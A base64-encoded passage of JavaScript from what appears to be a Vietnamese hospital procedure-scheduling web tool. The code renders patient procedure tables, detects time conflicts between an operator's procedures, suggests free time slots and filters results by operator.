CAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7ZXJyb3IucGF0aWVudEFnZX08L2ZvbnQ+XTxici8+JHtlcnJvci5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtkb2N0b3JDb2x1bW5TdHlsZX0iPiR7ZXJyb3IuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3Iub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IucHJvY2VkdXJlRGF0ZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5zdGFydERhdGV9PGJyLz4ke2Vycm9yLnN0YXJ0VGltZX08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0NCiAgICAgICAgICAgIDwvdGQ+DQogICAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICANCiAgICBkYXRlTWlzbWF0Y2hMb2dEaXYuaW5uZXJIVE1MID0gaHRtbDsNCn0NCg0KDQoNCg0KZnVuY3Rpb24gZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMocHJvY2VkdXJlcykgew0KICAgIGNvbnN0IHRpbWVPcHRpb24gPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpbnB1dFtuYW1lPSJ0aW1lT3B0aW9uIl06Y2hlY2tlZCcpLnZhbHVlOw0KICAgIGNvbnN0IHN0YXJ0SG91ciA9IHRpbWVPcHRpb24gPT09ICc3OjMwJyA/IDcuNSA6IDc7DQogICAgY29uc3QgaWdub3JlQWRqYWNlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaWdub3JlQWRqYWNlbnRDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgYnVmZmVyTWludXRlcyA9IGlnbm9yZUFkamFjZW50ID8gMCA6IDE7DQogICAgY29uc3Qgc2hvd01vcmVTdWdnZXN0aW9ucyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3gnKS5jaGVja2VkOw0KICAgIA0KICAgIC8vIFPhu5Ega2h1bmcgZ2nhu50gdOG7kWkgxJFhIG3hu5dpIGJ14buVaSAobuG6v3UgY2jhu41uIDYga2h1bmcgdGjDrCAzIHPDoW5nICsgMyBjaGnhu4F1KQ0KICAgIGNvbnN0IG1heE1vcm5pbmcgPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDI7DQogICAgY29uc3QgbWF4QWZ0ZXJub29uID0gc2hvd01vcmVTdWdnZXN0aW9ucyA/IDMgOiAxOw0KDQogICAgcHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICBpZiAoIXByb2MuY29uZmxpY3QpIHJldHVybjsNCg0KICAgICAgICBjb25zdCBzYW1lRGF5UHJvY2VkdXJlcyA9IHByb2NlZHVyZXMuZmlsdGVyKHAgPT4gDQogICAgICAgICAgICBwLmRhdGUgPT09IHByb2MuZGF0ZSAmJiANCiAgICAgICAgICAgIHAub3BlcmF0b3IgPT09IHByb2Mub3BlcmF0b3IgJiYNCiAgICAgICAgICAgIHAucm93SW5kZXggIT09IHByb2Mucm93SW5kZXgNCiAgICAgICAgKTsNCg0KICAgICAgICBjb25zdCBkdXJhdGlvblNlY29uZHMgPSBwcm9jLmVuZCAtIHByb2Muc3RhcnQgKyAoYnVmZmVyTWludXRlcyAqIDYwKTsNCiAgICAgICAgDQogICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gYnXhu5VpIHPDoW5nDQogICAgICAgIGNvbnN0IG1vcm5pbmdTbG90cyA9IGZpbmRBdmFpbGFibGVTbG90cygNCiAgICAgICAgICAgIHN0YXJ0SG91ciAqIDM2MDAsIA0KICAgICAgICAgICAgMTEuNSAqIDM2MDAsIA0KICAgICAgICAgICAgZHVyYXRpb25TZWNvbmRzLCANCiAgICAgICAgICAgIHNhbWVEYXlQcm9jZWR1cmVzLCANCiAgICAgICAgICAgIG1heE1vcm5pbmcNCiAgICAgICAgKTsNCiAgICAgICAgDQogICAgICAgIC8vIFTDrG0ga2h1bmcgZ2nhu50gYnXhu5VpIGNoaeG7gXUNCiAgICAgICAgY29uc3QgYWZ0ZXJub29uU2xvdHMgPSBmaW5kQXZhaWxhYmxlU2xvdHMoDQogICAgICAgICAgICAxMy41ICogMzYwMCwgDQogICAgICAgICAgICAxNyAqIDM2MDAsIA0KICAgICAgICAgICAgZHVyYXRpb25TZWNvbmRzLCANCiAgICAgICAgICAgIHNhbWVEYXlQcm9jZWR1cmVzLCANCiAgICAgICAgICAgIG1heEFmdGVybm9vbg0KICAgICAgICApOw0KDQogICAgICAgIC8vIEZvcm1hdCBr4bq/dCBxdeG6ow0KICAgICAgICBsZXQgc3VnZ2VzdGlvbnMgPSBbXTsNCiAgICAgICAgaWYgKG1vcm5pbmdTbG90cy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBzdWdnZXN0aW9ucy5wdXNoKCc8c3Ryb25nPlPDoW5nOjwvc3Ryb25nPjxicj4nICsgDQogICAgICAgICAgICAgICAgbW9ybmluZ1Nsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICB9DQogICAgICAgIGlmIChhZnRlcm5vb25TbG90cy5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBzdWdnZXN0aW9ucy5wdXNoKCc8c3Ryb25nPkNoaeG7gXU6PC9zdHJvbmc+PGJyPicgKyANCiAgICAgICAgICAgICAgICBhZnRlcm5vb25TbG90cy5tYXAoc2xvdCA9PiBgJHtzbG90LnN0YXJ0fSAtICR7c2xvdC5lbmR9YCkuam9pbignPGJyPicpKTsNCiAgICAgICAgfQ0KDQogICAgICAgIA0KaWYgKG1vcm5pbmdTbG90cy5sZW5ndGggKyBhZnRlcm5vb25TbG90cy5sZW5ndGggPiAwKSB7DQogICAgcHJvYy5zdWdnZXN0aW9uID0gc3VnZ2VzdGlvbnMuam9pbignPGJyPicpOw0KfSBlbHNlIHsNCiAgICBwcm9jLnN1Z2dlc3Rpb24gPSAnPHNwYW4gY2xhc3M9Im5vLXN1Z2dlc3Rpb24iPktow7RuZyBjw7Mga2h1bmcgZ2nhu50gdHLhu5FuZzwvc3Bhbj4nOw0KfQ0KDQogICAgfSk7DQp9DQovLyBIw6BtIGtp4buDbSB0cmEgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW4NCmZ1bmN0aW9uIGhhc1RpbWVDb25mbGljdChzdGFydFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgZW5kVGltZSA9IHN0YXJ0VGltZSArIGR1cmF0aW9uOw0KICAgIA0KICAgIGZvciAoY29uc3QgcHJvYyBvZiBwcm9jZWR1cmVzKSB7DQogICAgICAgIGNvbnN0IHByb2NTdGFydCA9IHByb2Muc3RhcnQ7DQogICAgICAgIGNvbnN0IHByb2NFbmQgPSBwcm9jLmVuZCArIChwcm9jLnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICANCiAgICAgICAgaWYgKChzdGFydFRpbWUgPj0gcHJvY1N0YXJ0ICYmIHN0YXJ0VGltZSA8IHByb2NFbmQpIHx8IA0KICAgICAgICAgICAgKGVuZFRpbWUgPiBwcm9jU3RhcnQgJiYgZW5kVGltZSA8PSBwcm9jRW5kKSB8fA0KICAgICAgICAgICAgKHN0YXJ0VGltZSA8PSBwcm9jU3RhcnQgJiYgZW5kVGltZSA+PSBwcm9jRW5kKSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KLy8gSMOgbSB0w6xtIGtodW5nIGdp4budIHRy4buRbmcNCmZ1bmN0aW9uIGZpbmRBdmFpbGFibGVTbG90cyhzdGFydFRpbWUsIGVuZFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzLCBtYXhTbG90cykgew0KICAgIGNvbnN0IHNsb3RzID0gW107DQogICAgbGV0IGN1cnJlbnRUaW1lID0gc3RhcnRUaW1lOw0KICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGJ1ZmZlck1pbnV0ZXMgPSBpZ25vcmVBZGphY2VudCA/IDAgOiAxOw0KICAgIA0KICAgIHdoaWxlIChjdXJyZW50VGltZSArIGR1cmF0aW9uIDw9IGVuZFRpbWUgJiYgc2xvdHMubGVuZ3RoIDwgbWF4U2xvdHMpIHsNCiAgICAgICAgaWYgKCFoYXNUaW1lQ29uZmxpY3QoY3VycmVudFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzKSkgew0KICAgICAgICAgICAgc2xvdHMucHVzaCh7DQogICAgICAgICAgICAgICAgc3RhcnQ6IHNlY29uZHNUb1RpbWVTdHIoY3VycmVudFRpbWUpLA0KICAgICAgICAgICAgICAgIGVuZDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSArIChkdXJhdGlvbiAtIChidWZmZXJNaW51dGVzICogNjApKSkgLy8gVHLhu6sgYnVmZmVyIMSR4buDIGhp4buDbiB0aOG7iw0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgY3VycmVudFRpbWUgKz0gMTUgKiA2MDsgLy8gS2nhu4NtIHRyYSBt4buXaSAxNSBwaMO6dA0KICAgIH0NCiAgICANCiAgICByZXR1cm4gc2xvdHM7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gc2Vjb25kc1RvVGltZVN0cihzZWNvbmRzKSB7DQogICAgICAgICAgICBjb25zdCBob3VycyA9IE1hdGguZmxvb3Ioc2Vjb25kcyAvIDM2MDApOw0KICAgICAgICAgICAgY29uc3QgbWludXRlcyA9IE1hdGguZmxvb3IoKHNlY29uZHMgJSAzNjAwKSAvIDYwKTsNCiAgICAgICAgICAgIHJldHVybiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YDsNCiAgICAgICAgfQ0KDQoNCi8vIMSQ4bq/bSB04buVbmcgY2EgInPhuq9jIHRodeG7kWMiIGtow6FjIMSRYSBz4buRIChvdXRsaWVyKQ0KZnVuY3Rpb24gZ2V0SGVyYk91dGxpZXJUb3RhbCgpIHsNCiAgY29uc3QgaGVyYnMgPSBBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgPyB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgOiBbXTsNCiAgY29uc3QgY291bnRzQnlEYXRlID0ge307DQogIGhlcmJzLmZvckVhY2goaCA9PiB7DQogICAgY29uc3QgZCA9IGguZGF0ZTsNCiAgICBjb25zdCBuID0gKGgub3BlcmF0b3IgfHwgJ0tow7RuZyBjw7MnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCiAgICBpZiAoIWNvdW50c0J5RGF0ZVtkXSkgY291bnRzQnlEYXRlW2RdID0ge307DQogICAgY291bnRzQnlEYXRlW2RdW25dID0gKGNvdW50c0J5RGF0ZVtkXVtuXSB8fCAwKSArIDE7DQogIH0pOw0KICBsZXQgb3V0bGllcnMgPSAwOw0KICBPYmplY3QudmFsdWVzKGNvdW50c0J5RGF0ZSkuZm9yRWFjaChtYXAgPT4gew0KICAgIGNvbnN0IGVudHJpZXMgPSBPYmplY3QuZW50cmllcyhtYXApLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgY29uc3QgdG9wID0gZW50cmllc1swXTsgaWYgKCF0b3ApIHJldHVybjsNCiAgICBjb25zdCB0b3BOYW1lID0gdG9wWzBdOw0KICAgIGVudHJpZXMuZm9yRWFjaCgoW25hbWUsIGNudF0pID0+IHsgaWYgKG5hbWUgIT09IHRvcE5hbWUpIG91dGxpZXJzICs9IGNudDsgfSk7DQogIH0pOw0KICByZXR1cm4gb3V0bGllcnM7DQp9DQoNCi8vIMSQ4bq/bSBs4buXaSBzYWkgdGjhu51pIGdpYW4gKGvhur90IHRow7pjIDw9IGLhuq90IMSR4bqndSwgxJHhu4tuaCBk4bqhbmcgc2FpLCBzYWkgcGjDunQgc28gduG7m2kgcXV5IMSR4buLbmgsLi4uKQ0KZnVuY3Rpb24gZ2V0VGltZUVycm9yVG90YWwoKSB7DQogIC8vIMSQ4bq/bSDEkcO6bmcgdGhlbyBz4buRIGjDoG5nIGzhu5dpIMSRYW5nIGhp4buDbiB0aOG7iw0KICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsgLy8gdsO5bmcgYuG6o25nIGzhu5dpIHRo4budaSBnaWFuDQogIGlmICghY29udGFpbmVyKSByZXR1cm4gMDsNCiAgcmV0dXJuIGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yQWxsKCd0ci5lcnJvci1yb3cnKS5sZW5ndGg7DQp9DQoNCmZ1bmN0aW9uIGdldENvbmZsaWN0VG90YWwoKSB7DQogIC8vIMSQ4bq/bSDEkcO6bmcgdGhlbyBz4buRIGjDoG5nIHh1bmcgxJHhu5l0IHRyb25nIGvhur90IHF14bqjDQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsgLy8gdGJvZHkgY+G7p2EgYuG6o25nIGvhur90IHF14bqjDQogIGlmICghdGJvZHkpIHJldHVybiAwOw0KICByZXR1cm4gdGJvZHkucXVlcnlTZWxlY3RvckFsbCgndHIuY29uZmxpY3Qtcm93JykubGVuZ3RoOw0KfQ0KDQoNCg0KDQoNCg0KDQoNCiAgICAgICBmdW5jdGlvbiBkaXNwbGF5UmVzdWx0cyhwcm9jZWR1cmVzLCBza2lwcGVkUm93cyA9IDApIHsNCiAgICBhbGxQcm9jZWR1cmVzID0gcHJvY2VkdXJlczsNCiAgICANCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChwcm9jZWR1cmVzLm1hcChwID0+IHAub3BlcmF0b3IpKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdEVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdEVycm9yLmlubmVySFRNTCA9IG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTDsgLy8gxJDhu5NuZyBi4buZIG7hu5lpIGR1bmcNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JGaWx0ZXJFcnJvcicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBjb25mbGljdFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuY29uZmxpY3QpOw0KICAgICAgICAgICAgY29uc3QgY29uZmxpY3RDb3VudCA9IGNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGg7DQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBO4bq/dSBraMO0bmcgY8OzIGzhu5dpLCBjdeG7mW4geHXhu5FuZyBwaOG6p24ga+G6v3QgcXXhuqMNCiAgICBpZiAoZXJyb3JMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgY29uc3QgcmVzdWx0U2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJyk7DQogICAgICAgICAgICBpZiAocmVzdWx0U2VjdGlvbikgew0KICAgICAgICAgICAgICAgIHNtb290aFNjcm9sbFRvKHJlc3VsdFNlY3Rpb24sIC00MCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0sIDMwMCk7DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBmaWx0ZXJCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykudmFsdWU7DQoNCiBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QudG9nZ2xlKCdzaG93LWRvY3RvcicsIHNob3dEb2N0b3IpOw0KICAgIC8vID09PT09IDEuIEzhu4xDIFbDgCBISeG7gk4gVEjhu4ogQuG6ok5HIEvhur5UIFFV4bqiIEtJ4buCTSBUUkEgWFVORyDEkOG7mFQgPT09PT0NCiAgICBjb25zdCBmaWx0ZXJlZFByb2NlZHVyZXMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gYWxsUHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLmNvbmZsaWN0KSANCiAgICAgICAgOiBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpICYmIHAuY29uZmxpY3QpOw0KDQogICAgY29uc3QgcmVzdWx0Qm9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRCb2R5Jyk7DQogICAgcmVzdWx0Qm9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIC8vIE5ow7NtIGPDoWMgdGjhu6cgdGh14bqtdCB4dW5nIMSR4buZdCB24bubaSBuaGF1DQogICAgY29uc3QgY29uZmxpY3RHcm91cHMgPSBbXTsNCiAgICBjb25zdCBwcm9jZXNzZWRSb3dzID0gbmV3IFNldCgpOw0KDQogICAgZmlsdGVyZWRQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvY2Vzc2VkUm93cy5oYXMocHJvYy5yb3dJbmRleCkpIHsNCiAgICAgICAgICAgIGNvbnN0IGdyb3VwID0gW3Byb2NdOw0KICAgICAgICAgICAgcHJvY2Vzc2VkUm93cy5hZGQocHJvYy5yb3dJbmRleCk7DQoNCiAgICAgICAgICAgIC8vIFTDrG0gdGjhu6cgdGh14bqtdCBsacOqbiBxdWFuIHRyb25nIHh1bmcgxJHhu5l0DQogICAgICAgICAgICBpZiAocHJvYy5jb25mbGljdFJlYXNvbikgew0KICAgICAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0TWF0Y2hlcyA9IHByb2MuY29uZmxpY3RSZWFzb24ubWF0Y2goL0Lhu4duaCBuaMOibjogKC4qPyk8YnI+4oCiIE5nw6B5OiAoLio/KTxicj7igKIgVGjhu51pIGdpYW46ICguKj8pLS9nKTsNCiAgICAgICAgICAgICAgICBpZiAoY29uZmxpY3RNYXRjaGVzKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0TWF0Y2hlcy5mb3JFYWNoKG1hdGNoID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhdGllbnROYW1lID0gbWF0Y2gubWF0Y2goL0Lhu4duaCBuaMOibjogKC4qPyk8YnI+LylbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXRlID0gbWF0Y2gubWF0Y2goL05nw6B5OiAoLio/KTxicj4vKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWUgPSBtYXRjaC5tYXRjaCgvVGjhu51pIGdpYW46ICguKj8pLS8pWzFdOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjb25mbGljdFByb2MgPSBmaWx0ZXJlZFByb2NlZHVyZXMuZmluZChwID0+IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAucGF0aWVudE5hbWUgPT09IHBhdGllbnROYW1lICYmIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuZGF0ZSA9PT0gZGF0ZSAmJiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLmRpc3BsYXlTdGFydCA9PT0gdGltZSAmJg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICFwcm9jZXNzZWRSb3dzLmhhcyhwLnJvd0luZGV4KQ0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbmZsaWN0UHJvYykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdyb3VwLnB1c2goY29uZmxpY3RQcm9jKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzZWRSb3dzLmFkZChjb25mbGljdFByb2Mucm93SW5kZXgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjb25mbGljdEdyb3Vwcy5wdXNoKGdyb3VwKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAvLyBIaeG7g24gdGjhu4sga+G6v3QgcXXhuqMNCiAgICBjb25mbGljdEdyb3Vwcy5mb3JFYWNoKGdyb3VwID0+IHsNCiAgICAgICAgZ3JvdXAuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCdjb25mbGljdC1yb3cnKTsNCiAgICAgICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wYXRpZW50TmFtZX0gWzxmb250IGNvbG9yPSJyZWQiPiR7cHJvYy5wYXRpZW50QWdlfTwvZm9udD5dIDxici8+ICR7cHJvYy5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7cHJvYy5kYXRlfTxici8+JHtwcm9jLmRpc3BsYXlTdGFydH0gLSAke3Byb2MuZGlzcGxheUVuZH08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+JHtwcm9jLmRvY3Rvcn08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9InRpbWUtc3VnZ2VzdGlvbiI+JHtwcm9jLnN1Z2dlc3Rpb24gfHwgJ0tow7RuZyBjw7MgeHVuZyDEkeG7mXQnfTwvdGQ+DQogICAgICAgICAgICBgOw0KICAgICAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgICAgICB9KTsNCg0KICAgICAgICAvLyBUaMOqbSBkw7JuZyBwaMOibiBjw6FjaA0KICAgICAgICBpZiAoZ3JvdXAubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgY29uc3Qgc2VwYXJhdG9yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgICAgIHNlcGFyYXRvci5pbm5lckhUTUwgPSAnPHRkIGNvbHNwYW49IjgiIGNsYXNzPSJncm91cC1zZXBhcmF0b3IiPjwvdGQ+JzsNCiAgICAgICAgICAgIHJlc3VsdEJvZHkuYXBwZW5kQ2hpbGQoc2VwYXJhdG9yKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAgLy8gTuG6v3Uga2jDtG5nIGPDsyBuaMOzbSBuw6BvIHRow6wgdGjDqm0gZMOybmcgYsOhbyAiS2jDtG5nIGPDsyBs4buXaSINCiAgICBpZiAoY29uZmxpY3RHcm91cHMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNSJjbGFzcz0iaGVyYi1yb3cgY29uZmxpY3Qtcm93Ij5LaMO0bmcgY8OzIGzhu5dpIG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvdGQ+DQogICAgICAgIGA7DQogICAgICAgIHJlc3VsdEJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9DQoNCiAgICAvLyA9PT09PSAyLiBM4buMQyBWw4AgSEnhu4JOIFRI4buKIELhuqJORyBM4buWSSA9PT09PQ0KY29uc3Qgb3BlcmF0b3JFcnJvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdEVycm9yJykudmFsdWU7DQogY29uc3QgZmlsdGVyZWRFcnJvcnMgPSBvcGVyYXRvckVycm9yID09PSAnYWxsJyANCiAgID8gZXJyb3JMb2cgDQogICA6IGVycm9yTG9nLmZpbHRlcihlcnJvciA9Pg0KICAgICAgIGVycm9yLmRldGFpbHMgJiYNCiAgICAgIGVycm9yLmRldGFpbHMub3BlcmF0b3IgJiYNCiAgICAgICBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpID09PSBvcGVyYXRvckVycm9yLnJlcGxhY2UoLywvZywgJycpDQogICAgKTsNCg0KICAgIC8vIEhp4buDbiB0aOG7iyBs4buXaSDEkcOjIGzhu41jDQogICAgY29uc3QgZXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsNCiAgICBpZiAoZmlsdGVyZWRFcnJvcnMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGVycm9yTG9nRGl2LmlubmVySFRNTCA9IGA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT4gPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI1I